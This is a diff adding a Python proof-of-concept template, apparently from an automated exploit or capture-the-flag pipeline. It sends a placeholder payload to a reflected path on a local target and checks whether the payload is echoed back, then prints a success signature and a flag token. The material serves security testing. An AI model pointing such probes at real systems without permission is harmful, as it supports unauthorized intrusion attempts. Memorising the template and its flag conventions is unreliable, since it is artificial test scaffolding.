@@ -1,0 +1,37 @@
+import argparse
+import sys
+from urllib.parse import quote
+from urllib.request import urlopen
+from urllib.error import URLError, HTTPError
+
+# Asset-backed generic unsupported fallback PoC template.
+SUCCESS_SIGNATURE = __SUCCESS_SIGNATURE__
+FLAG_TOKEN = __FLAG_TOKEN__
+DEFAULT_PAYLOAD = __DEFAULT_PAYLOAD__
+PATH = __REFLECT_PATH_LITERAL__
+
+def exploit(base_url: str, payload: str) -> bool:
+    url = base_url.rstrip('/') + PATH + '?q=' + quote(payload)
+    try:
+        with urlopen(url, timeout=5) as resp:
+            body = resp.read().decode('utf-8', errors='ignore')
+    except (HTTPError, URLError) as exc:
+        print(f'[fallback] request failed: {exc}', file=sys.stderr)
+        return False
+    return payload in body
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='Fallback PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        if FLAG_TOKEN:
+            print(FLAG_TOKEN)
+        sys.exit(0)
+    print('[fallback] exploit did not succeed', file=sys.stderr)
+    sys.exit(1)
+
+if __name__ == '__main__':
+    main()
